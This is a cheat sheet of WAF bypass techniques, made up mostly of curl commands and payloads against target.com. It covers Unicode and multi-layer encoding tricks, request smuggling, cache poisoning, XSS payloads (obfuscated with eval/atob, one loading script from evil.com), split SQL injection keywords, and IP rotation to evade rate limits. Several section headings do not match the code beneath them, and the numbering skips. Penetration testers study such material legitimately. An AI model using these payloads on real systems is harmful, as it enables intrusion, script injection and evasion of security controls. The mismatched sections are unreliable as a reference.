# 1. Path Manipulation Bypasses
## A. Unicode/Whitespace in Paths

```bash
# Test with different Unicode characters
curl https://target.com/admin%c2%a0          # \u00A0 (non-breaking space)
curl https://target.com/admin%09            # \t (tab)
curl https://target.com/admin%0c            # \f (form feed)
curl https://target.com/admin%85            # \u0085 (next line)

# Node.js/Express often removes these
# Nginx may keep them → bypass
```

## B. Double Extensions

```bash
# Some WAFs don't parse chunked well
curl -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "7\r\nx=test&\r\n0\r\n\r\n" \
  https://target.com
```

# C. Duplicate Headers

```bash
# Send multiple headers
curl -H "X-Forwarded-For: 1.1.1.1" \
     -H "X-Forwarded-For: 127.0.0.1" \
     https://target.com
```

# 4. Encoding Bypasses

## A. Multiple URL Encoding

```bash
# Akamai decodes 10 times
curl https://target.com/?x=%252525253Cscript%252525253E
# WAF sees: <script>
# Backend sees: %253Cscript%253E (still valid)
```

## B. Unicode Normalization

```bash
# Compatibility characters
curl https://target.com/?x=%EF%BC%9Cscript%EF%BC%9E
# ＜ (U+FF1C) and ＞ (U+FF1E) normalize to < and >
```

## C. Mixed Encoding

```bash
# Hex, octal, URL mix
curl https://target.com/?x=%3C\x73cript\x3ealert(1)%3C/script%3E
```

# 5. Static Asset Bypass

## A. .js/.css Extension Bypass

```bash
# WAFs often skip inspecting static files
curl https://target.com/static/app.js?param=<script>
curl https://target.com/style.css?x=javascript:alert(1)

# Then trigger cached response
curl -H "User-Agent: <script>alert(1)</script>" \
  https://target.com/static/app.js
# Immediate request to main page may get cached poisoned response
```

## B. Parameter Pollution

```bash
# Append .js to any path
curl https://target.com/admin/login.js
curl https://target.com/api/users.js
```

# 6. Protocol-Level Bypasses

## A. HTTP/2 Smuggling

```bash
# H2C (HTTP/2 over cleartext)
curl --http2-prior-knowledge \
  https://target.com \
  -H ":method: POST" \
  -H ":path: /admin" \
  -d "x=<script>"
```

## B. Method Override

```bash
# X-HTTP-Method-Override
curl -X POST https://target.com/api \
  -H "X-HTTP-Method-Override: DELETE" \
  -d "id=1"
```

# 7. Regex Bypasses

# A. Case Variations

```bash
# Case-insensitive matching
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT SRC="//evil.com"></SCRIPT>
```

# B. Whitespace Tricks

```bash
# Different whitespace characters
<img/src="x"/onerror=alert(1)>  # No space after tag name
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

# C. HTML Entities

```yaml
# Mixed encoding
<&#x73;cript>alert(1)</script>
<&#115;cript>alert(1)</script>
<img src=x on&#101;rror=alert(1)>
```

## D. Javascript Obfuscation

```bash
// Function constructor
Function("al"+"ert(1)")();
window["al"+"ert"](1);
eval(atob("YWxlcnQoMSk="));  // Base64 encoded
```

# 8. IP Rotation Bypass

## A. Using API Gateways

```bash
# Tools for IP rotation
# fireprox, catspin, ip-rotate

# Example with curl through proxies
curl --proxy http://proxy1:8080 https://target.com
curl --proxy http://proxy2:8080 https://target.com
```

## B. String Concatenation

```bash
# Break up keywords
curl https://target.com/?q=sel'||'ect * from users
curl https://target.com/?q=UNI/**/ON SEL/**/ECT 1,2,3
```

# 10. Tools & Automation

## A. Burp Suite Extension

```yaml
- nowafpls: Add junk data
- ip-rotate: Rotate IPs
- Param Miner: Find hidden params
- Turbo Intruder: Fast bypass testing
```

## B. Command Line Tools

```bash
# wafw00f - WAF detection
wafw00f https://target.com

# WhatWaf - Bypass testing
whatwaf -u https://target.com --ra

# ffuf with wordlists
ffuf -u https://target.com/FUZZ \
  -w /path/to/bypasses.txt
```

# 11. Quick Testing Workflow

## Step 1: Detect WAF

```bash
wafw00f https://target.com
curl -I https://target.com | grep -i server
# Check headers: X-WAF, X-Protected-By, Server
```

## Step 2: Test Basic Bypass

```bash
# 1. Path manipulation
curl https://target.com/admin%20
curl https://target.com/admin/

# 2. Case variation
curl -H "user-AGENT: test"

# 3. Encoding
curl https://target.com/?x=%3Cscript%3E

# 4. Large request
curl -X POST -d @large.txt https://target.com
```

## Step 3: Advanced Tests

```bash
# 1. Unicode bypasses
# 2. Protocol manipulation
# 3. IP rotation
# 4. Static file bypass
```

##  🔥Critical Findings Priority

1. **Path traversal with Unicode** → access blocked pages
    
2. **Request size overflow** → bypass all WAF rules
    
3. **Static file bypass** → poison cache, deliver payloads
    
4. **Multiple encoding** → hide from WAF but execute
    
5. **Header manipulation** → SQLi/XSS in headers
    
6. **IP rotation** → bypass rate limits
    
7. **Protocol confusion** → H2C smuggling
    
8. **Case/whitespace variations** → regex bypass